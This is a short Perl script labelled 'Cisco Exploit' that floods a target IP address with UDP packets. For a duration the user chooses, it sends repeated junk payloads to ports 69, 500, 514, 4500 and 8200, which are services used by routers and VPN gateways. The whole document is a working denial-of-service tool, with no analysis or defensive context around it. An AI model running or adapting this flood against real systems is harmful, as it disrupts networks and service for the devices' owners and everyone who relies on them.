use Socket;
use strict;
if ($#ARGV != 1) {
system("cls");
print "Cisco Exploit\n";
exit(1);
}
my ($ip,$length) = @ARGV;
my ($iaddr,$endtime,$psize);
$iaddr = inet_aton("$ip");
$endtime = time() + ($length ? $length : 1000000);
socket(flood, PF_INET, SOCK_DGRAM, 17);
for (;time() <= $endtime;) 
{
$psize = int(rand(1024-64)+126) ;

   
  send(flood, "$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize", 0, pack_sockaddr_in(69, $iaddr));
  send(flood, "$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize", 0, pack_sockaddr_in(500, $iaddr));
  send(flood, "$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize", 0, pack_sockaddr_in(514, $iaddr));
  send(flood, "$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize", 0, pack_sockaddr_in(4500, $iaddr));
  send(flood, "$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize", 0, pack_sockaddr_in(8200, $iaddr));

};
	
	